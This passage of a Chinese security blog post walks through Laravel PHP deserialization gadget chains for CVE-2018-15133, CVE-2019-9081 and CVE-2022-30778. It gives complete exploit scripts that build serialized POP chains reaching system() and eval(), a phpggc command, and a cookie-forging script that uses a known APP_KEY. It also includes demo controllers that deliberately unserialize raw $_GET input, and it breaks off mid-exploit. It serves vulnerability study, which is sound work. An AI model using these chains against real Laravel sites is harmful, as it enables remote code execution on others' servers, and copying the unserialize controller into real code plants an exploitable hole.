href="https://xz.aliyun.com/t/11886%EF%BC%8C%E6%89%BE%E5%88%B0%E4%BA%86%E5%8F%A6%E5%A4%96%E4%B8%80%E7%A7%8D%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%EF%BC%8C%E8%BF%99%E9%87%8C%E9%9C%80%E8%A6%81%E5%8E%BBhttps://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/%E7%9C%8B%E7%9C%8B%EF%BC%8C%E7%90%86%E8%A7%A3%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E4%B8%AD%E7%9A%84R%E5%92%8Cr%E7%9A%84%E5%85%B3%E7%B3%BB%EF%BC%8C%E5%85%B7%E4%BD%93%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86%E9%87%8C%E9%9D%A2%E6%9C%89%E8%AE%B2">https://xz.aliyun.com/t/11886，找到了另外一种绕过方法，这里需要去https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/看看，理解序列化字符串中的R和r的关系，具体绕过原理里面有讲</a></p><p>总的来说就是：</p><ol><li>让 <code>Faker\Generator</code> 的 <code>$this-&gt;formatters</code> 和某个对象<code>$o</code>的某个属性 <code>$a</code> 指向同一个值</li><li>在 <code>Faker\Generator</code> 的 <code>__wakeup()</code> 运行完之后，反序列化 gadget 的 <code>__destruct()</code> 运行之前，给 <code>$a</code> 赋值</li><li><code>$a</code> 的赋值如果完全可控，那么 <code>$this-&gt;formatters</code> 将不再为空，且完全可控</li></ol><p>构造链子的过程<a href="https://xz.aliyun.com/t/11886%E6%9C%89%EF%BC%8C%E8%BF%99%E9%87%8C%E5%B0%B1%E4%B8%8D%E5%A4%9ABB%E4%BA%86%EF%BC%8C%E4%B8%8B%E9%9D%A2%E6%98%AF%E8%87%AA%E5%B7%B1%E5%86%99%E9%93%BE%E5%AD%90%E7%9A%84%E6%97%B6%E5%80%99%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91%EF%BC%9A">https://xz.aliyun.com/t/11886有，这里就不多BB了，下面是自己写链子的时候遇到的一些坑：</a></p><p>首先是构造<code>Symfony\Component\Routing\Route</code>的时候，没有实现Serializable接口的方法，导致报错无法进行下去，尽管在利用的过程中没有找到利用到它们的地方</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230720203701975.png" alt="image-20230720203701975"></p><p>还有就是替换的地方，需要了解序列化字符串的结果，每个符号表示什么，主要是准确找到需要替换的地方</p><pre><code class="php">echo urlencode(str_replace(&#39;a:1:&#123;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;&#39;, &#39;R:14;&#39;, serialize($a)));</code></pre><p>R后面的数字是什么意思，参考这篇文章<a href="https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/">https://blog.frankli.site/2021/04/11/Security/php-src/PHP-Serialize-tips/</a></p><p>最后的POC</p><pre><code class="php">&lt;?phpnamespace Symfony\Component\Routing\Loader\Configurator;use Symfony\Component\Routing\RouteCollection;use Symfony\Component\Routing\Route;use Illuminate\Broadcasting\PendingBroadcast;class CollectionConfigurator&#123;    private $route;    public function __construct()    &#123;        $this-&gt;parent = new RouteCollection();        $this-&gt;collection = new RouteCollection();        $this-&gt;route = new Route(&#39;&#39;);        $this-&gt;parentConfigurator = new PendingBroadcast();    &#125;&#125;namespace Symfony\Component\Routing;class RouteCollection&#123;    private $routes;    public function __construct()    &#123;        $this-&gt;routes = array(&quot;dispatch&quot; =&gt; &quot;system&quot;);    &#125;&#125;namespace Symfony\Component\Routing;class Route implements \Serializable&#123;    private $path;    public function __construct()    &#123;        $this-&gt;path=&quot;//&quot;;    &#125;    public function serialize()    &#123;        return serialize([            &#39;path&#39; =&gt; $this-&gt;path,            &#39;host&#39; =&gt; $this-&gt;host,            &#39;defaults&#39; =&gt; $this-&gt;defaults,            &#39;requirements&#39; =&gt; $this-&gt;requirements,            &#39;options&#39; =&gt; $this-&gt;options,            &#39;schemes&#39; =&gt; $this-&gt;schemes,            &#39;methods&#39; =&gt; $this-&gt;methods,            &#39;condition&#39; =&gt; $this-&gt;condition,            &#39;compiled&#39; =&gt; $this-&gt;compiled,        ]);    &#125;    public function unserialize($serialized)    &#123;    &#125;&#125;//---------------下面这段是前面未成功的POCnamespace Illuminate\Broadcasting;use Faker\Generator;class PendingBroadcast&#123;    protected $events;    protected $event;    public function __construct()    &#123;        $this-&gt;events=new Generator();        $this-&gt;event=&quot;calc&quot;;    &#125;&#125;namespace Faker;class Generator&#123;    protected $formatters = array();    public function __construct()    &#123;        $this-&gt;formatters=[&quot;aa&quot;=&gt;&quot;bb&quot;];    &#125;&#125;use Symfony\Component\Routing\Loader\Configurator\CollectionConfigurator;$a = new CollectionConfigurator();echo urlencode(str_replace(&#39;a:1:&#123;s:2:&quot;aa&quot;;s:2:&quot;bb&quot;;&#125;&#39;, &#39;R:14;&#39;, serialize($a)));</code></pre><h3 id="CVE-2018-15133"><a href="#CVE-2018-15133" class="headerlink" title="CVE-2018-15133"></a>CVE-2018-15133</h3><p>漏洞利用前提：</p><p>需要获取app_key+Laravel framework 5.5.x&lt;&#x3D;5.5.40或5.6.x&lt;&#x3D;5.6.29</p><p>环境搭建：</p><pre><code class="php">composer create-project laravel/laravel laravel-5.6.29 --prefer-dist &quot;5.6.0&quot;</code></pre><p>然后修改composer.json  中的<code>laravel/framework</code>版本为<strong>5.6.29</strong>  运行composer update</p><p>如果出现报错：PackageManifest.php: Undefined index: name</p><pre><code class="php">找到对应文件 :vendor/laravel/framework/src/Illuminate/Foundation/PackageManifest.php找到对应行注释掉 :$packages = json_decode($this-&gt;files-&gt;get($path), true);在这里新增两行代码$installed = json_decode($this-&gt;files-&gt;get($path), true);$packages = $installed[&#39;packages&#39;] ?? $installed;</code></pre><p>官方修复：<code>src/Illuminate/Cookie/Middleware/EncryptCookies.php</code><br><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721094831825.png" alt="image-20230721094831825"></p><p><code>src/Illuminate/Foundation/Http/Middleware/VerifyCsrfToken.php</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721094915218.png" alt="image-20230721094915218"></p><p>官方通过添加静态的serialized方法来控制序列化和反序列化  </p><p>在<code>src/Illuminate/Cookie/Middleware/EncryptCookies.php</code>中，找到官方修复的地方</p><pre><code class="php">protected function encrypt(Response $response)    &#123;        foreach ($response-&gt;headers-&gt;getCookies() as $cookie) &#123;            if ($this-&gt;isDisabled($cookie-&gt;getName())) &#123;                continue;            &#125;            $response-&gt;headers-&gt;setCookie($this-&gt;duplicate(                $cookie, $this-&gt;encrypter-&gt;encrypt($cookie-&gt;getValue())            ));        &#125;        return $response;    &#125;</code></pre><p>这里是cookie加密的地方，首先从http请求中获取cookie,然后传进<code>isDisabled</code>进行检查, 这方法不重要，重要的是后面的<code>encrypt</code>方法，经过这个方法加密得到的cookie,然后传给setCookie，响应到前端设置新的Cookie值</p><p>下面跟进encrypt方法：</p><pre><code class="php">public function encrypt($value, $serialize = true)    &#123;        $iv = random_bytes(openssl_cipher_iv_length($this-&gt;cipher));        // First we will encrypt the value using OpenSSL. After this is encrypted we        // will proceed to calculating a MAC for the encrypted value so that this        // value can be verified later as not having been changed by the users.        $value = \openssl_encrypt(            $serialize ? serialize($value) : $value,            $this-&gt;cipher, $this-&gt;key, 0, $iv        );        if ($value === false) &#123;            throw new EncryptException(&#39;Could not encrypt the data.&#39;);        &#125;        // Once we get the encrypted value we&#39;ll go ahead and base64_encode the input        // vector and create the MAC for the encrypted value so we can then verify        // its authenticity. Then, we&#39;ll JSON the data into the &quot;payload&quot; array.        $mac = $this-&gt;hash($iv = base64_encode($iv), $value);        $json = json_encode(compact(&#39;iv&#39;, &#39;value&#39;, &#39;mac&#39;));        if (json_last_error() !== JSON_ERROR_NONE) &#123;            throw new EncryptException(&#39;Could not encrypt the data.&#39;);        &#125;        return base64_encode($json);    &#125;</code></pre><p>加密的过程如下：</p><ol><li><p>先随机生成一个初始化向量iv,iv 的长度由所选的加密算法决定,这里的加密算法默认是<code>AES-128-CBC</code>,也可能是AES-256-CBC，调试发现是使用AES-256-CBC</p></li><li><p>然后使用 OpenSSL 库中的 <code>openssl_encrypt()</code> 方法对数据进行加密。如果 <code>$serialize</code> 参数为 <code>true</code>，则将值先进行序列化，然后再进行加密。加密使用了指定的加密算法 <code>$this-&gt;cipher</code>即，密钥为 <code>$this-&gt;key</code>，即base64解密后的APP_KEY ，加密模式为默认值 0，使用前面生成的 iv</p></li><li><p>下一步是检查加密过程是否失败，如果失败则抛出 <code>EncryptException</code> 异常</p></li><li><p>mac的计算是通过调用 <code>hash()</code> 方法，使用哈希算法生成对加密后的数据进行校验的消息认证码（Message Authentication Code, MAC）。其中，IV 经过 Base64 编码后作为参数传递给 <code>hash()</code> 方法。</p></li><li><p>将 iv、加密后的值和 MAC 组成一个关联数组，然后使用 JSON 编码将其转换为字符串</p></li><li><p>最后就是将JSON字符串进行base64编码返回到前端</p></li></ol><p>这里加密存在序列化，说明解密过程大概率存在反序列化</p><pre><code class="php">protected function decrypt(Request $request)    &#123;        foreach ($request-&gt;cookies as $key =&gt; $cookie) &#123;            if ($this-&gt;isDisabled($key)) &#123;                continue;            &#125;            try &#123;                $request-&gt;cookies-&gt;set($key, $this-&gt;decryptCookie($cookie));            &#125; catch (DecryptException $e) &#123;                $request-&gt;cookies-&gt;set($key, null);            &#125;        &#125;        return $request;    &#125;</code></pre><p>这个解密和加密差不多，重请求中获取cookie，然后进行解密，跟进<code>decryptCookie</code></p><pre><code class="php">protected function decryptCookie($cookie)    &#123;        return is_array($cookie)                        ? $this-&gt;decryptArray($cookie)                        : $this-&gt;encrypter-&gt;decrypt($cookie);    &#125;</code></pre><p>这里会判断cookie是不是数组，如果是则调用<code>decryptArray</code>,如果不是则直接调用<code>decrypt</code></p><p>查看<code>decryptArray</code></p><pre><code class="php">protected function decryptArray(array $cookie)    &#123;        $decrypted = [];        foreach ($cookie as $key =&gt; $value) &#123;            if (is_string($value)) &#123;                $decrypted[$key] = $this-&gt;encrypter-&gt;decrypt($value);            &#125;        &#125;        return $decrypted;    &#125;</code></pre><p>如果是数组则遍历解密，直接看<code>decrypt</code>方法</p><pre><code class="php">public function decrypt($payload, $unserialize = true)    &#123;        $payload = $this-&gt;getJsonPayload($payload);        $iv = base64_decode($payload[&#39;iv&#39;]);        // Here we will decrypt the value. If we are able to successfully decrypt it        // we will then unserialize it and return it out to the caller. If we are        // unable to decrypt this value we will throw out an exception message.        $decrypted = \openssl_decrypt(            $payload[&#39;value&#39;], $this-&gt;cipher, $this-&gt;key, 0, $iv        );        if ($decrypted === false) &#123;            throw new DecryptException(&#39;Could not decrypt the data.&#39;);        &#125;        return $unserialize ? unserialize($decrypted) : $decrypted;    &#125;</code></pre><ol><li>通过调用 <code>getJsonPayload()</code> 方法获取密文数据的 JSON 解码后的关联数组</li><li>将 Base64 编码的 IV 进行解码，得到原始的初始化向量</li><li>然后使用 OpenSSL 库中的 <code>openssl_decrypt()</code> 方法对密文进行解密。解密使用了与加密时相同的加密算法 <code>$this-&gt;cipher</code> 和密钥 <code>$this-&gt;key</code>，加密模式为默认值 0，初始化向量为之前解码得到的 IV</li><li>检查解密过程是否失败，如果失败则抛出 <code>DecryptException</code> 异常</li><li>根据 <code>$unserialize</code> 参数决定是否进行反序列化操作。如果指定为 <code>true</code>，则对解密后的数据进行反序列化并返回，否则直接返回解密后的数据。</li></ol><p>到这里很清晰的知道如何触发反序列化漏洞了，就是构造value部分，将序列化后的字符串进行AES-256-CBC加密</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721154009506.png" alt="image-20230721154009506"></p><p>下一步就是找反序列化链，这里可以直接使用<a href="https://github.com/ianxtianxt/phpggc">https://github.com/ianxtianxt/phpggc</a> 工具生成,建议生成的序列化字符串进行base64编码，如果直接复制去加密，大概率会出错，导致反序列化不成功</p><pre><code class="bash">./phpggc Laravel/RCE3 system calc | base64</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721195009139.png" alt="image-20230721195009139"></p><p>然后就按照上面的加密过程进行写个php加密脚本</p><p>$key是<code>APP_KEY</code> , $value是上面工具生成</p><pre><code class="php">&lt;?php$key = &quot;qiGlxICOjT6xZ70O4qMc2oHPWjzqLT4bH8ePsfXavRU=&quot;;$value = &quot;Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6MTp7czo5OiIAKgBldmVudHMiO086Mzk6IklsbHVtaW5hdGVcTm90aWZpY2F0aW9uc1xDaGFubmVsTWFuYWdlciI6Mzp7czo2OiIAKgBhcHAiO3M6NDoiY2FsYyI7czoxNzoiACoAZGVmYXVsdENoYW5uZWwiO3M6MToieCI7czoxNzoiACoAY3VzdG9tQ3JlYXRvcnMiO2E6MTp7czoxOiJ4IjtzOjY6InN5c3RlbSI7fX19Cg==&quot;;$cipher = &#39;AES-256-CBC&#39;;$iv = random_bytes(openssl_cipher_iv_length($cipher));$value = \openssl_encrypt(    base64_decode($value), $cipher, base64_decode($key), 0, $iv);$iv = base64_encode($iv);$mac = hash_hmac(&#39;sha256&#39;, $iv.$value, base64_decode($key));$json = json_encode(compact(&#39;iv&#39;, &#39;value&#39;, &#39;mac&#39;));$encodedPayload = base64_encode($json);echo &quot;加密结果&quot; . $encodedPayload . &quot;;&quot;;</code></pre><p>然后随便替换一个cookie即可</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230721180612955.png" alt="image-20230721180612955"></p><h3 id="CVE-2019-9081"><a href="#CVE-2019-9081" class="headerlink" title="CVE-2019-9081"></a>CVE-2019-9081</h3><p>漏洞简介：</p><p>Laravel Framework 5.7.x版本中的Illuminate组件存在反序列化漏洞，远程攻击者可利用该漏洞执行代码</p><p>环境搭建</p><pre><code>composer create-project laravel/laravel laravel-5.7.29 --prefer-dist &quot;5.7&quot;</code></pre><p>添加控制器：<code>Http/Controllers/POPController.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers;class POPController extends Controller&#123;    public function index()    &#123;        if(isset($_GET[&#39;c&#39;]))&#123;            $c = $_GET[&#39;c&#39;];            unserialize($c);        &#125;        else&#123;            phpinfo();        &#125;    &#125;&#125;</code></pre><p>添加路由<code>routes/web.php</code></p><pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);</code></pre><p>Laravel v5.7相较Laravel v5.6在<code>vendor/laravel/framework/src/Illuminate/Foundation/Testing</code>下新增了<code>PendingCommand.php</code>，其中有<code>PendingCommand</code>类，它的<code>__destruct</code>方法是这样的</p><pre><code class="php">public function __destruct()    &#123;        if ($this-&gt;hasExecuted) &#123;            return;        &#125;        $this-&gt;run();    &#125;</code></pre><p>查看官方文档</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724101641216.png" alt="image-20230724101641216"></p><p>这个run方法是用来执行命令的</p><p>查看这个方法：</p><pre><code class="php">public function run()    &#123;        $this-&gt;hasExecuted = true;        $this-&gt;mockConsoleOutput();        try &#123;            $exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);        &#125; catch (NoMatchingExpectationException $e) &#123;            if ($e-&gt;getMethodName() === &#39;askQuestion&#39;) &#123;                $this-&gt;test-&gt;fail(&#39;Unexpected question &quot;&#39;.$e-&gt;getActualArguments()[0]-&gt;getQuestion().&#39;&quot; was asked.&#39;);            &#125;            throw $e;        &#125;        if ($this-&gt;expectedExitCode !== null) &#123;            $this-&gt;test-&gt;assertEquals(                $this-&gt;expectedExitCode, $exitCode,                &quot;Expected status code &#123;$this-&gt;expectedExitCode&#125; but received &#123;$exitCode&#125;.&quot;            );        &#125;        return $exitCode;    &#125;</code></pre><p>可以猜测<code>$exitCode = $this-&gt;app[Kernel::class]-&gt;call($this-&gt;command, $this-&gt;parameters);</code>这个是用来执行命令的，具体是怎么执行命令的需要调试一下，但是<code>mockConsoleOutput()</code>方法里面报错了</p><p>为了程序能够走到<code>$exitCode</code>,跟进<code>mockConsoleOutput()</code></p><pre><code class="php">protected function mockConsoleOutput()    &#123;        $mock = Mockery::mock(OutputStyle::class.&#39;[askQuestion]&#39;, [            (new ArrayInput($this-&gt;parameters)), $this-&gt;createABufferedOutputMock(),        ]);        foreach ($this-&gt;test-&gt;expectedQuestions as $i =&gt; $question) &#123;            $mock-&gt;shouldReceive(&#39;askQuestion&#39;)                -&gt;once()                -&gt;ordered()                -&gt;with(Mockery::on(function ($argument) use ($question) &#123;                    return $argument-&gt;getQuestion() == $question[0];                &#125;))                -&gt;andReturnUsing(function () use ($question, $i) &#123;                    unset($this-&gt;test-&gt;expectedQuestions[$i]);                    return $question[1];                &#125;);        &#125;        $this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123;            return $mock;        &#125;);    &#125;</code></pre><p>第一个出现的报错是<code>$this-&gt;parameters</code>没有值，这里需要的是一个数组，那就给他一个数组</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724103411878.png" alt="image-20230724103411878"></p><p>再跟进第二行的<code>createABufferedOutputMock()</code></p><pre><code class="php">private function createABufferedOutputMock()    &#123;        $mock = Mockery::mock(BufferedOutput::class.&#39;[doWrite]&#39;)                -&gt;shouldAllowMockingProtectedMethods()                -&gt;shouldIgnoreMissing();        foreach ($this-&gt;test-&gt;expectedOutput as $i =&gt; $output) &#123;            $mock-&gt;shouldReceive(&#39;doWrite&#39;)                -&gt;once()                -&gt;ordered()                -&gt;with($output, Mockery::any())                -&gt;andReturnUsing(function () use ($i) &#123;                    unset($this-&gt;test-&gt;expectedOutput[$i]);                &#125;);        &#125;        return $mock;    &#125;</code></pre><p>第二个报错就是在这里</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724102703652.png" alt="image-20230724102703652"></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724102723368.png" alt="image-20230724102723368"></p><p>此时这个test和expectedOutput都是空的，这里有两个思路，一个是触发__get然后返回，第二个是找到一个存在expectedOutput属性的方法</p><p>这里直接找__get，如果找到一个get直接返回，那就省事多了</p><p>找到了<code>vendor/fzaninotto/faker/src/Faker/DefaultGenerator.php</code></p><pre><code class="php">public function __get($attribute)    &#123;        return $this-&gt;default;    &#125;</code></pre><p>这个返回值<code>$this-&gt;default</code>可以控制，随便给他赋值就行</p><p>所以直接让<code>$this-&gt;test=new DefaultGenerator()</code>就行</p><p>然后直接执行到了<code>mockConsoleOutput</code>的最后</p><pre><code class="php">$this-&gt;app-&gt;bind(OutputStyle::class, function () use ($mock) &#123;            return $mock;        &#125;);</code></pre><p>这个app也需要赋值，还关联着后面命令执行的地方<code>$this-&gt;app[Kernel::class]</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724105210640.png" alt="image-20230724105210640"></p><p>这里的$this-&gt;app[Kernel::class]应该是获取应用内核实例，百度查了一下，这个$this-&gt;app应该是<code>Illuminate\Container\Container</code>这个类</p><p>因为它是Laravel中的容器的实现，而且这个类中存在bind方法，满足了<code>mockConsoleOutput</code>的最后，不会报错，然后还存在<code>call</code>方法,满足$this-&gt;app[Kernel::class]-&gt;call()</p><p>所以</p><pre><code class="php">$this-&gt;app = new Container();</code></pre><p>往下运行发现报错了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724145143441.png" alt="image-20230724145143441"></p><p>报错的位置在<code>resolve</code>方法里，由于$concrete和$abstract相同，进入了build方法</p><pre><code class="php">protected function isBuildable($concrete, $abstract)    &#123;        return $concrete === $abstract || $concrete instanceof Closure;    &#125;</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724145927211.png" alt="image-20230724145927211"></p><p>在build方法中，由于Illuminate\Contracts\Console\Kernel无法实例化然后报错了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724150317385.png" alt="image-20230724150317385"></p><p>所以要跟进查看<code>$concrete = $this-&gt;getConcrete($abstract)</code>，让其一个可以实例化的<code>$concrete</code></p><pre><code class="php">protected function getConcrete($abstract)    &#123;        if (! is_null($concrete = $this-&gt;getContextualConcrete($abstract))) &#123;            return $concrete;        &#125;        // If we don&#39;t have a registered resolver or concrete for the type, we&#39;ll just        // assume each type is a concrete name and will attempt to resolve it as is        // since the container should be able to resolve concretes automatically.        if (isset($this-&gt;bindings[$abstract])) &#123;            return $this-&gt;bindings[$abstract][&#39;concrete&#39;];        &#125;        return $abstract;    &#125;</code></pre><p>该方法用于获取给定抽象类型（$abstract）对应的具体实现类。首先，代码会检查是否存在上下文相关的具体实现（Contextual Concrete）。如果存在，即在容器中为该抽象类型设置了上下文绑定，则直接返回上下文相关的具体实现。</p><p>如果没有上下文相关的具体实现，代码会继续判断是否在容器的绑定数组（$this-&gt;bindings）中存在对该抽象类型的绑定。如果存在，即为该抽象类型设置了绑定，那么代码会返回该绑定定义中的具体实现（’concrete’ 字段）。</p><p>如果以上两种情况都不满足，即既没有上下文相关的具体实现，也没有显式的绑定定义，那么代码会默认将抽象类型作为具体实现来返回。</p><p>这里的<code>$this-&gt;bindings</code>是可控的，可以构造</p><pre><code class="php">$this-&gt;bindings=[&quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt;[&quot;concrete&quot;=&gt;&quot;Illuminate\\Container\\Container&quot;]];</code></pre><p>然后这里就会返回<code>Illuminate\Container\Container</code>这个类</p><p>第一次运行到<code>resolve</code>时，走的是make方法，</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724151523216.png" alt="image-20230724151523216"></p><pre><code class="php">public function make($abstract, array $parameters = [])    &#123;        return $this-&gt;resolve($abstract, $parameters);    &#125;</code></pre><p>由于make调用了<code>$this-&gt;resolve</code>,又回到这里，但是这次走的是build方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724151820887.png" alt="image-20230724151820887"></p><p>到最后返回run()的是<code>Illuminate\Container\Container</code>这个类的对象，然后调用这个对象的call方法</p><p>这个call方法中的参数<code>$this-&gt;command</code>, <code>$this-&gt;parameters</code>可控，也就是下面的$callback和<code>$parameters</code></p><pre><code class="php">public function call($callback, array $parameters = [], $defaultMethod = null)    &#123;        return BoundMethod::call($this, $callback, $parameters, $defaultMethod);    &#125;</code></pre><p>跟进<code>BoundMethod::call</code></p><pre><code class="php">public static function call($container, $callback, array $parameters = [], $defaultMethod = null)    &#123;        if (static::isCallableWithAtSign($callback) || $defaultMethod) &#123;            return static::callClass($container, $callback, $parameters, $defaultMethod);        &#125;        return static::callBoundMethod($container, $callback, function () use ($container, $callback, $parameters) &#123;            return call_user_func_array(                $callback, static::getMethodDependencies($container, $callback, $parameters)            );        &#125;);    &#125;</code></pre><p>可以看到<code>call_user_func_array</code>函数，调试发现$callback&#x3D;”system“是不会进入if语句的，重点放在后面</p><p>跟进getMethodDependencies</p><pre><code class="php">protected static function getMethodDependencies($container, $callback, array $parameters = [])    &#123;        $dependencies = [];        foreach (static::getCallReflector($callback)-&gt;getParameters() as $parameter) &#123;            static::addDependencyForCallParameter($container, $parameter, $parameters, $dependencies);        &#125;        return array_merge($dependencies, $parameters);    &#125;</code></pre><p>这个方法通过反射获取回调函数或方法的参数列表，然后根据参数列表中每个参数的类型和名称，解析对应的依赖关系。最终将解析出来的依赖关系和额外参数合并返回。</p><p>所以<code>$parameters</code>即<code>$this-&gt;parameters</code>是一个数组</p><pre><code class="php">$this-&gt;parameters = array(&#39;calc&#39;);</code></pre><p>返回后调用<code>call_user_func_array</code>,执行了代码system(“calc”);</p><p>最终的exp:</p><pre><code class="php">&lt;?phpnamespace Illuminate\Foundation\Testing;use Illuminate\Container\Container;use Faker\DefaultGenerator;class PendingCommand&#123;    protected $parameters;    public $test;    protected $app;    protected $command;    public function __construct()    &#123;        $this-&gt;command = &quot;system&quot;;        $this-&gt;parameters = array(&#39;calc&#39;);        $this-&gt;test = new DefaultGenerator();        $this-&gt;app = new Container();    &#125;&#125;namespace Faker;class DefaultGenerator&#123;    protected $default;    public function __construct()    &#123;        $this-&gt;default = [&#39;a&#39;];    &#125;&#125;namespace Illuminate\Container;class Container&#123;    protected $bindings = [];    public function __construct()    &#123;        $this-&gt;bindings=[&quot;Illuminate\\Contracts\\Console\\Kernel&quot;=&gt;[&quot;concrete&quot;=&gt;&quot;Illuminate\\Container\\Container&quot;]];    &#125;&#125;use Illuminate\Foundation\Testing\PendingCommand;$a = new PendingCommand();echo urlencode(serialize($a));</code></pre><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230724153739330.png" alt="image-20230724153739330"></p><h3 id="5-8-x-CVE-2022-30778"><a href="#5-8-x-CVE-2022-30778" class="headerlink" title="5.8.x(CVE-2022-30778)"></a>5.8.x(CVE-2022-30778)</h3><p>环境搭建</p><pre><code>composer create-project laravel/laravel laravel-5.8 --prefer-dist &quot;5.8&quot;</code></pre><p>添加控制器：<code>Http/Controllers/POPController.php</code></p><pre><code class="php">&lt;?phpnamespace App\Http\Controllers;class POPController extends Controller&#123;    public function index()    &#123;        if(isset($_GET[&#39;c&#39;]))&#123;            $c = $_GET[&#39;c&#39;];            unserialize($c);        &#125;        else&#123;            phpinfo();        &#125;    &#125;&#125;</code></pre><p>添加路由<code>routes/web.php</code></p><pre><code class="php">Route::get(&quot;/&quot;,&quot;\App\Http\Controllers\POPController@index&quot;);</code></pre><p>在寻找新链子之前，看看上一个还能不能用，测试发现CVE-2019-9081这条链子还是能用的</p><h4 id="POP1"><a href="#POP1" class="headerlink" title="POP1"></a>POP1</h4><p>寻找入口__destruct()和5.4的一样，在<code>vendor/laravel/framework/src/Illuminate/Broadcasting/PendingBroadcast.php</code></p><pre><code class="php">public function __destruct()    &#123;        $this-&gt;events-&gt;dispatch($this-&gt;event);    &#125;</code></pre><p>这个 <code>$this-&gt;events</code>可控,这里可以从两个方面入手，一个是__call 另一个是任意类的dispatch方法</p><p>这条链子使用的是vendor&#x2F;laravel&#x2F;framework&#x2F;src&#x2F;Illuminate&#x2F;Bus&#x2F;Dispatcher.php的<code>dispatch</code>方法</p><pre><code class="php">public function dispatch($command)    &#123;        if ($this-&gt;queueResolver &amp;&amp; $this-&gt;commandShouldBeQueued($command)) &#123;            return $this-&gt;dispatchToQueue($command);        &#125;        return $this-&gt;dispatchNow($command);    &#125;</code></pre><p>$this-&gt;queueResolver可控，跟进<code>commandShouldBeQueued()</code></p><pre><code class="php">protected function commandShouldBeQueued($command)    &#123;        return $command instanceof ShouldQueue;    &#125;</code></pre><p>如果<code>$command</code>是ShouldQueue的实现类，就会返回true，然后调用<code>dispatchToQueue()</code></p><pre><code class="php">public function dispatchToQueue($command)    &#123;        $connection = $command-&gt;connection ?? null;        $queue = call_user_func($this-&gt;queueResolver, $connection);        if (! $queue instanceof Queue) &#123;            throw new RuntimeException(&#39;Queue resolver did not return a Queue implementation.&#39;);        &#125;        if (method_exists($command, &#39;queue&#39;)) &#123;            return $command-&gt;queue($queue, $command);        &#125;        return $this-&gt;pushCommandToQueue($queue, $command);    &#125;</code></pre><p>这里很明显的看到call_user_func()  这个<code>$this-&gt;queueResolver</code>可控，并且<code> $command-&gt;connection</code>这个也可控</p><p>所以这里就可以任意命令执行了</p><p>现在要找到一个ShouldQueue的实现类，直接搜就行，即使其没有<code>connection</code>属性</p><p>这里找到的是<code>Illuminate\Broadcasting\BroadcastEvent</code></p><p>最后的exp:</p><pre><code class="php">&lt;?phpnamespace Illuminate\Broadcasting;use Illuminate\Bus\Dispatcher;use Illuminate\Broadcasting\BroadcastEvent;class PendingBroadcast&#123;    protected $events;    protected $event;    public function __construct()    &#123;        $this-&gt;events=new Dispatcher();        $this-&gt;event=new BroadcastEvent();    &#125;&#125;namespace Illuminate\Bus;class Dispatcher&#123;    protected $queueResolver;    public function __construct()    &#123;        $this-&gt;queueResolver=&quot;system&quot;;    &#125;&#125;namespace Illuminate\Contracts\Queue;interface ShouldQueue&#123;&#125;namespace Illuminate\Broadcasting;use Illuminate\Contracts\Queue\ShouldQueue;class BroadcastEvent implements ShouldQueue&#123;    public $connection;    public function __construct()    &#123;        $this-&gt;connection=&quot;calc&quot;;    &#125;&#125;use  Illuminate\Broadcasting\PendingBroadcast;$a = new PendingBroadcast();echo urlencode(serialize($a));</code></pre><h4 id="POP2"><a href="#POP2" class="headerlink" title="POP2"></a>POP2</h4><p>上面的这条链子还没完，还可以往下走，就是执行到<code>call_user_func()</code>的时候，不执行命令，这里是可以执行任意类的任意方法的</p><p>所以找到的是vendor&#x2F;mockery&#x2F;mockery&#x2F;library&#x2F;Mockery&#x2F;Loader&#x2F;EvalLoader.php</p><pre><code class="php">class EvalLoader implements Loader&#123;    public function load(MockDefinition $definition)    &#123;        if (class_exists($definition-&gt;getClassName(), false)) &#123;            return;        &#125;        eval(&quot;?&gt;&quot; . $definition-&gt;getCode());    &#125;&#125;</code></pre><p>这个<code>eval(&quot;?&gt;&quot; . $definition-&gt;getCode())</code>可以实现任意代码执行，</p><pre><code class="php">public function getCode()    &#123;        return $this-&gt;code;    &#125;</code></pre><p>$this-&gt;code可控，剩下的就是让代码走到这个地方</p><p>最后的exp:</p><pre><code class="php">&lt;?phpnamespace Illuminate\Broadcasting;use Illuminate\Bus\Dispatcher;use Illuminate\Broadcasting\BroadcastEvent;class PendingBroadcast&#123;    protected $events;    protected $event;    public function __construct()    &#123;        $this-&gt;events=new Dispatcher();        $this-&gt;event=new BroadcastEvent();    &#125;&#125;namespace Illuminate\Bus;use Mockery\Loader\EvalLoader;class Dispatcher&#123;    protected $queueResolver;    public function __construct()    &#123;        $this-&gt;queueResolver=array(new EvalLoader(),&quot;load&quot;);    